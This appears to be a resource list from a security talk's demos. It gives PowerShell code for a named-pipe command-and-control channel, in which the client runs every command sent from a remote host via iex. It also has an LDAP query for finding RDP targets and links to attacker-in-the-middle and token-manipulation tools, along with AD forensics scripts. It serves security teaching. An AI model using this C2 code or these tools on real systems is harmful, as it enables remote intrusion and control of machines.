<b>Scripts, tools and commands shown or mentioned in the demos of this talk:</B>
<br>
Named pipes C2:

# client side

$pipe = new-object System.IO.Pipes.NamedPipeClientStream '10.0.0.1','mypipe','In'; $pipe.Connect(); $sr = new-object System.IO.StreamReader $pipe; while (($data = $sr.ReadLine()) -ne $null) { iex $data }

#$sr.Dispose(); $pipe.Dispose() 

#---------------------------------------------
# Server side

$pipe = new-object System.IO.Pipes.NamedPipeServerStream 'mypipe','Out'; $pipe.WaitForConnection(); $sw = new-object System.IO.StreamWriter $pipe; $sw.AutoFlush = $true; $sw.WriteLine("whoami")

#$sw.Dispose(); $pipe.Dispose()

<br>
Detecting targets ‘Living off the land’ (RDP hosts without NLA enforced):

([adsisearcher]'(&(serviceprincipalname=*TERMSRV*)(operatingsystem=*windows*server*200*))').FindAll()

<br>
RDP AitM:

https://github.com/SySS-Research/Seth

<br>
Track past changes in AD accounts without logs:

https://github.com/YossiSassi/AD-Replication-Metadata

<br>
Get change history for AD group memberships:

https://github.com/YossiSassi/Get-ADGroupChanges

<br>
Token duplication (one option out of many):

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
